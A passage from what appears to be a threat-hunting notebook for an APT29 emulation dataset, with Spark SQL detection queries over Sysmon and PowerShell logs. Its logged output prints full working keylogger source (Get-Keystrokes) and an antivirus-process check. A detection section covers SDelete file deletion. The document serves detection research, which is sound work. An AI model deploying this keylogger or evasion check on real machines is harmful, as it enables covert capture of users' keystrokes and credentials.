-RECORD 1-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Get-Keystrokes {
&lt;#
.SYNOPSIS
 
    Logs keys pressed, time and the active window (when changed).
    Some modifications for Empire by @harmj0y.
    
    PowerSploit Function: Get-Keystrokes
    Author: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
    Modifications: @harmj0y
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
.LINK
    http://www.obscuresec.com/
    http://www.exploit-monday.com/
#&gt;
    Start-Job -Name &quot;Keystrokes&quot; -ScriptBlock {
        Write-Host &quot;`nJobPID`n------`n$PID&quot;
        [Reflection.Assembly]::LoadWithPartialName(&#39;System.Windows.Forms&#39;) | Out-Null

        try
        {
            $ImportDll = [User32]
        }
        catch
        {
            $DynAssembly = New-Object System.Reflection.AssemblyName(&#39;Win32Lib&#39;)
            $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(&#39;Win32Lib&#39;, $False)
            $TypeBuilder = $ModuleBuilder.DefineType(&#39;User32&#39;, &#39;Public, Class&#39;)

            $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
            $FieldArray = [Reflection.FieldInfo[]] @(
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;EntryPoint&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;ExactSpelling&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;SetLastError&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;PreserveSig&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;CallingConvention&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;CharSet&#39;)
            )

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;GetAsyncKeyState&#39;, &#39;Public, Static&#39;, [Int16], [Type[]] @([Windows.Forms.Keys]))
            $FieldValueArray = [Object[]] @(
                &#39;GetAsyncKeyState&#39;,
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;GetKeyboardState&#39;, &#39;Public, Static&#39;, [Int32], [Type[]] @([Byte[]]))
            $FieldValueArray = [Object[]] @(
                &#39;GetKeyboardState&#39;,
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;MapVirtualKey&#39;, &#39;Public, Static&#39;, [Int32], [Type[]] @([Int32], [Int32]))
            $FieldValueArray = [Object[]] @(
                &#39;MapVirtualKey&#39;,
                $False,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;ToUnicode&#39;, &#39;Public, Static&#39;, [Int32],
                [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
            $FieldValueArray = [Object[]] @(
                &#39;ToUnicode&#39;,
                $False,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;GetForegroundWindow&#39;, &#39;Public, Static&#39;, [IntPtr], [Type[]] @())
            $FieldValueArray = [Object[]] @(
                &#39;GetForegroundWindow&#39;,
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $ImportDll = $TypeBuilder.CreateType()
        }

        $LastWindowTitle = &quot;&quot;
        $i=0
        while ($true) {
            Start-Sleep -Milliseconds 40
            $gotit = &quot;&quot;
            $Outout = &quot;&quot;
            
            for ($char = 1; $char -le 254; $char++) {
                $vkey = $char
                $gotit = $ImportDll::GetAsyncKeyState($vkey)
                
                if ($gotit -eq -32767) {

                    #check for keys not mapped by virtual keyboard
                    $LeftShift    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
                    $RightShift   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
                    $LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
                    $RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
                    $LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
                    $RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
                    $TabKey       = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
                    $SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
                    $DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
                    $EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
                    $BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
                    $LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
                    $RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
                    $UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
                    $DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
                    $LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
                    $RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000

                    if ($LeftShift -or $RightShift) {$Outout += &#39;[Shift]&#39;}
                    if ($LeftCtrl  -or $RightCtrl)  {$Outout += &#39;[Ctrl]&#39;}
                    if ($LeftAlt   -or $RightAlt)   {$Outout += &#39;[Alt]&#39;}
                    if ($TabKey)       {$Outout += &#39;[Tab]&#39;}
                    if ($SpaceBar)     {$Outout += &#39;[SpaceBar]&#39;}
                    if ($DeleteKey)    {$Outout += &#39;[Delete]&#39;}
                    if ($EnterKey)     {$Outout += &#39;[Enter]&#39;}
                    if ($BackSpaceKey) {$Outout += &#39;[Backspace]&#39;}
                    if ($LeftArrow)    {$Outout += &#39;[Left Arrow]&#39;}
                    if ($RightArrow)   {$Outout += &#39;[Right Arrow]&#39;}
                    if ($UpArrow)      {$Outout += &#39;[Up Arrow]&#39;}
                    if ($DownArrow)    {$Outout += &#39;[Down Arrow]&#39;}
                    if ($LeftMouse)    {$Outout += &#39;[Left Mouse]&#39;}
                    if ($RightMouse)   {$Outout += &#39;[Right Mouse]&#39;}

                    #check for capslock
                    if ([Console]::CapsLock) {$Outout += &#39;[Caps Lock]&#39;}

                    $scancode = $ImportDll::MapVirtualKey($vkey, 0x3)
                    
                    $kbstate = New-Object Byte[] 256
                    $checkkbstate = $ImportDll::GetKeyboardState($kbstate)
                    
                    $mychar = New-Object -TypeName &quot;System.Text.StringBuilder&quot;;
                    $unicode_res = $ImportDll::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)

                    #get the title of the foreground window
                    $TopWindow = $ImportDll::GetForegroundWindow()
                    $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
                    
                    if ($unicode_res -gt 0) {
                        if ($WindowTitle -ne $LastWindowTitle){
                            # if the window has changed
                            $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
                            $Outout = &quot;`n`n$WindowTitle - $TimeStamp`n&quot;
                            $LastWindowTitle = $WindowTitle
                        }
                        $Outout += $mychar.ToString()
                        $Outout
                    }
                }
            }
        }
    }
}

ScriptBlock ID: fa9f2b3a-3f5e-4d3c-93c9-7172cc073add
Path: C:\Program Files\SysinternalsSuite\psversion.ps1 
-RECORD 2-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Keystroke-Check {
    Get-Process | Where-Object { $_.ProcessName -Eq &quot;avp&quot; -or $_.ProcessName -Eq &quot;acs&quot; -or $_.ProcessName -Eq &quot;outpost&quot; -or $_.ProcessName -Eq &quot;mcvsescn&quot; -or $_.ProcessName -Eq &quot;mcods&quot; -or $_.ProcessName -Eq &quot;navapsvc&quot; -or $_.ProcessName -Eq &quot;kav&quot; -or $_.ProcessName -Eq &quot;AvastSvc&quot; -or $_.ProcessName -Eq &quot;AvastUi&quot; -or $_.ProcessName -Eq &quot;nod32krn&quot; -or $_.ProcessName -Eq &quot;nod32&quot; -or $_.ProcessName -Eq &quot;ekern&quot; -or $_.ProcessName -Eq &quot;dwengine&quot; -or $_.ProcessName -Eq &quot;MsMpEng&quot; -or $_.ProcessName -Eq &quot;msseces&quot; -or $_.ProcessName -Eq &quot;ekrn&quot; -or $_.ProcessName -Eq &quot;savservice&quot; -or $_.ProcessName -Eq &quot;scfservice&quot; -or $_.ProcessName -Eq &quot;savadminservice&quot; }
}

ScriptBlock ID: a2a6be75-3568-4d81-a0ca-40a31de44589
Path: C:\Program Files\SysinternalsSuite\psversion.ps1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
-RECORD 3-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
get-process

ScriptBlock ID: 66a7f650-8a84-4dcf-a0f7-41d06de51f5c
Path:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-2-file-deletion">
<h2>4.B.2. File Deletion<a class="headerlink" href="#b-2-file-deletion" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Deleted rcs.3aka3.doc on disk using SDelete</p>
<p><strong>Criteria:</strong> sdelete64.exe deleting the file rcs.3aka3.doc</p>
<div class="section" id="id23">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id23" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:5EED5350-0BFD-4501-8B2D-4CE4F8F9E948</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT f.ProcessGuid</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessId, d.ProcessGuid</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND f.EventID = 1</span>
<span class="sd">    AND LOWER(f.Image) LIKE &#39;%sdelete%&#39;</span>
<span class="sd">    AND LOWER(f.CommandLine) LIKE &#39;%3aka3%&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------
 ProcessGuid | {47ab858c-e2ac-5eac-cb03-000000000400} 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:59A9AC92-124D-4C4B-A6BF-3121C98677C3</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT f.ProcessGuid</span>
<span class="sd">    FROM apt29Host f</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT d.ProcessId, d.ProcessGuid</span>
<span class="sd">      FROM apt29Host d</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">        FROM apt29Host a</span>
<span class="sd">        INNER JOIN (</span>
<span class="sd">          SELECT ProcessGuid</span>
<span class="sd">          FROM apt29Host</span>
<span class="sd">          WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">              AND EventID = 1</span>
<span class="sd">              AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">              AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">        ) b</span>
<span class="sd">        ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">        WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND a.EventID = 1</span>
<span class="sd">          AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">      ) c</span>
<span class="sd">      ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">      WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND d.EventID = 1</span>
<span class="sd">        AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">    ) e</span>
<span class="sd">    ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">    WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND f.EventID = 1</span>
<span class="sd">      AND LOWER(f.Image) LIKE &#39;%sdelete%&#39;</span>
<span class="sd">      AND LOWER(f.CommandLine) LIKE &#39;%3aka3%&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON h.ProcessGuid = g.ProcessGuid</span>
<span class="sd">WHERE h.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND h.EventID in (12,13)</span>
<span class="sd">    AND LOWER(h.TargetObject) RLIKE &#39;.*\\\\\\\\software\\\\\\\\sysinternals\\\\\\\\sdelete.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
